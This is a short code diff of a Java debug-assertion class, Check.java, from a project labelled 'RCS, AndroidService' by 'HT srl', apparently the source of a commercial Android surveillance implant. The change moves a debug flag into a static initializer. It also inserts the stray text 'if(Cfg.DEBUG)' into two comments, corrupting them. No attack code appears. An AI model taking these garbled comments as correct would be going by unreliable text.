@@ -2,7 +2,7 @@
  * Copyright (c) 2011
  * HT srl,   All rights reserved.
  * Project      : RCS, AndroidService
- * File         : Check.java
+ * File         : if(Cfg.DEBUG) Check.java
  * Created      : Apr 9, 2011
  * Author		: zeno
  * *******************************************/
@@ -14,16 +14,12 @@ import android.util.Log;
 import com.android.service.auto.Cfg;
 
 /**
- * The Class Check.
+ * The Class if(Cfg.DEBUG) Check.
  */
 public final class Check {
 
 	private static final String TAG = "Check";
-	private static boolean enabled;
-
-	private Check() {
-		enabled = Cfg.DEBUG;
-	}
+	private static boolean enabled = Cfg.DEBUG;
 
 	/**
 	 * Asserts, used to verify the truth of an expression
